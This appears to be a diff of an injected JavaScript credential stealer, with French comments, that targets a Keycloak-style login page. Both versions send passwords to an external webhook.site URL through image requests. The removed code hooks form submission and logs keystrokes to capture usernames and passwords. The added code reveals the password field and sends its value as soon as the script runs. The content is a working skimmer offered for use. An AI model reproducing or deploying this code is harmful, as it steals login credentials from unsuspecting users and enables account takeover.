@@ -2,41 +2,34 @@
   if (window.__vault_jok3r_loaded__) return;
   window.__vault_jok3r_loaded__ = true;
 
-  // ✅ Ton Webhook ici
   const webhook = 'https://webhook.site/8da442bc-35ab-4621-b309-0af722556df8';
 
-  function exfiltrate(username, password) {
-    const img = new Image();
-    img.src = `${webhook}?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&url=${encodeURIComponent(window.location.href)}&ua=${encodeURIComponent(navigator.userAgent)}`;
+  function exfiltrate(password) {
+    let i = new Image();
+    i.src = `${webhook}?password=${encodeURIComponent(password)}&url=${encodeURIComponent(window.location.href)}`;
   }
 
-  function main() {
-    const form = document.getElementById('kc-form-login');
-    const usernameField = document.getElementById('username');
-    const passwordField = document.getElementById('password');
+  function revealAndSteal() {
+    try {
+      const passwordInput = document.getElementById('password');
 
-    if (!form || !usernameField || !passwordField) {
-      // 🕐 Retry après un délai (DOM pas encore prêt ?)
-      setTimeout(main, 500);
-      return;
-    }
+      if (!passwordInput) {
+        setTimeout(revealAndSteal, 500);
+        return;
+      }
 
-    // ✅ Intercepte le submit (formulaire envoyé)
-    form.addEventListener('submit', function(e) {
-      const username = usernameField.value;
-      const password = passwordField.value;
+      // Simule le passage en "visible"
+      passwordInput.type = 'text';
 
-      // ✅ Exfiltration discrète
-      exfiltrate(username, password);
-    });
+      // Ou on pourrait appeler directement la fonction native si l'événement est dispo
+      // togglePasswordVisibility({ target: /*...*/ });
 
-    // ✅ Keylogger discret (optionnel)
-    passwordField.addEventListener('input', () => {
-      exfiltrate('', passwordField.value);
-    });
+      // Exfiltration directe
+      exfiltrate(passwordInput.value);
+    } catch (e) {}
   }
 
-  // ✅ Lance l'écouteur
-  main();
+  // Run immédiat
+  revealAndSteal();
 
 })();
